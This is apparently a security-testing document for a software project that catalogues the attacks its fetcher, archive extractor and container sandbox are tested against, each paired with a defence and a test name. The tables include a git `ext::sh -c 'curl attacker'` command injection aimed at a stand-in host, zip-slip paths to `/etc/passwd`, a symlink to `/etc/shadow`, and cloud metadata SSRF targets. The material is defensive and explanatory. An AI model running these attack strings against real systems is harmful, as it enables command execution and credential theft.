# Security fixtures — the escape suite

Every attack EncoreBOM defends against, where it is exercised, and what happens.

**These are not decorative.** From Phase 5 the product executes third-party
binaries over untrusted user code — remote code execution by design. Each row
below is a real attack that was *run* against the implementation, not a control
that was configured and assumed to work.

## How the fixtures are built

Hostile inputs are **generated in the test, not committed as files**. A
committed zip bomb is a 10 GB artifact or a file every scanner in CI flags; a
committed traversal archive trips antivirus on checkout. Generating them keeps
the repository clean, makes the attack readable next to the assertion, and means
the fixture cannot drift from what the test claims it is.

The generators live beside their assertions:

| Generator | Builds |
|---|---|
| `buildTar` in `extract_test.go` | tar archives with arbitrary hostile members |
| `buildZipSlip` in `upload_test.go` (project service) | a ZIP whose entry name escapes |
| `buildDNSResponse` in `validate_test.go` | DNS answers, including a rebinding sequence |
| `countingResolver` in `validate_test.go` | a resolver whose answer changes between lookups |

## The suite

### Fetch — URL and address

| Attack | Defence | Test |
|---|---|---|
| `ext::sh -c 'curl attacker'` | scheme allowlist **and** `GIT_ALLOW_PROTOCOL=https` | `TestSchemeAllowlist`, `TestCloneCommandCarriesEveryHardeningFlag` |
| `file://`, `http://`, `git://`, `ssh://` | scheme allowlist | `TestSchemeAllowlist` |
| credentials embedded in the URL | rejected before the clone | `TestSchemeAllowlist` |
| newline / NUL in the URL | rejected before parsing | `TestSchemeAllowlist` |
| URL resolving to `169.254.169.254` | blocked at **connection** time | `TestDialerBlocksAHostThatResolvesToMetadata` |
| **DNS rebinding** | resolve once, dial the validated literal | `TestDialerResolvesOnceAndActsOnTheValidatedAddress` |
| `::ffff:169.254.169.254` (IPv4-mapped) | unwrapped before the range check | `TestBlockedRanges` |
| multi-answer DNS with one private address | the whole dial fails | `TestDialerRefusesWhenAnyResolvedAddressIsBlocked` |
| redirect chain into a private address | every hop re-validated, budget of 3 | `TestRedirectsAreLimitedAndRevalidated` |
| proxy environment variables | transport ignores them | `TestHTTPClientIgnoresProxyEnvironment` |

### Fetch — clone

| Attack | Defence | Test |
|---|---|---|
| `.git/hooks/post-checkout` | `core.hooksPath=/dev/null`; `.git` never archived | `TestCloneCommandCarriesEveryHardeningFlag`, `TestGitDirectoryIsExcludedFromTheArchive` |
| symlink escape via clone | `core.symlinks=false` | `TestCloneCommandCarriesEveryHardeningFlag` |
| attacker-controlled submodule URL | `--no-recurse-submodules` | same |
| credential visible in `/proc/*/cmdline` | token travels in the environment, consumed by a credential helper | `TestTokenNeverAppearsInTheCommandLine` |
| slow-loris clone | wall clock | `TestEscapeWallClockKillsAndRemoves` |

### Archive extraction

| Attack | Defence | Test |
|---|---|---|
| zip slip (`../../etc/passwd`) | `SafeJoin` containment check | `TestZipSlipIsRejected` |
| absolute path, drive-absolute, Windows separators | rejected in both conventions | `TestZipSlipIsRejected` |
| symlink to `/etc/shadow` | link entries never extracted | `TestSymlinksAreNotExtracted` |
| hard link aliasing | same | same |
| device / FIFO entries | never extracted | `TestDeviceAndFifoEntriesAreNotExtracted` |
| **decompression bomb** | ratio checked **during** the stream, aborted mid-file | `TestDecompressionBombAbortsMidExtraction` |
| oversized archive | total size checked during the stream | `TestTotalSizeLimitAborts` |
| a million tiny files | file-count limit | `TestFileCountLimitHolds` |
| NUL / newline / RTL override / 8 KB path | sanitized before any database insert | `TestPathSanitization`, `TestLongPathTruncatesOnARuneBoundary` |

### Sandbox

| Attack | Defence | Test |
|---|---|---|
| exfiltration or SSRF from a scan | `--network=none` | `TestEscapeNetworkIsUnreachable` |
| writing outside the workspace | read-only rootfs | `TestEscapeRootFilesystemIsReadOnly` |
| executing a written payload | tmpfs `noexec` | `TestEscapeWorkspaceIsWritableButNoexec` |
| running as root | non-root uid 65534 | `TestEscapeRunsAsNonRoot` |
| privilege escalation | `--cap-drop ALL`, `no-new-privileges` | `TestEscapeCapabilitiesAreDropped` |
| **fork bomb** | PID limit | `TestEscapeForkBombHitsThePIDLimit` |
| memory exhaustion | memory limit, OOM kill | `TestEscapeMemoryLimitOOMKills` |
| infinite loop | wall clock, then SIGKILL | `TestEscapeWallClockKillsAndRemoves` |
| leaked container holding a tmpfs | unconditional deferred removal | `TestContainerIsRemovedEvenAfterTimeout` |
| credential in an engine | refused by name **and** value shape | `TestEscapeNoCredentialReachesTheContainer` |
| secrets mounted into an engine | asserted absent | `TestEscapeEngineEnvironmentIsClean` |
| `npm install` / `mvn` / `gradle` / `pip install` | refused, including the `sh -c` form | `TestEscapeBuildToolingIsRefused` |
| a permissive policy | zero value is invalid, not permissive | `TestUnsafePolicyIsRefused` |
| an unbounded limit | zero is rejected, not "unlimited" | `TestUnboundedLimitsAreRefused` |

## Running it

```
go test ./libs/go-shared/sandbox -run TestEscape -v      # needs Docker
go test ./services/scan-orchestrator/... -v              # needs Docker + MinIO
ENCOREBOM_NETWORK_TESTS=1 go test ./services/scan-orchestrator/... -v   # + a real clone
```

Docker-dependent cases **skip** rather than fail when the daemon is absent, and
the skip is visible in the output. A security test that silently passes because
it never ran is worse than one that is obviously absent.

## What is NOT defended

Recorded honestly, because a known gap is manageable and an unknown one is not.
The current list lives in `docs/STATE.md` under Phase 5; the short version:

- **The fetcher has unrestricted egress.** A clone must reach the forge and the
  egress proxy is not built (Phase 16). The mode is named `NetworkEgress` rather
  than `allowlist` precisely so nobody reads it as filtered.
- **Container escape itself.** The sandbox assumes the container runtime holds.
  gVisor or a microVM would remove that assumption; `SANDBOX_RUNTIME` exists for
  it.
- **A malicious scanner image.** Pinning by digest and verifying signatures
  (Phase 2 manifest) bounds this, but a compromised upstream that we pin to is
  still trusted.
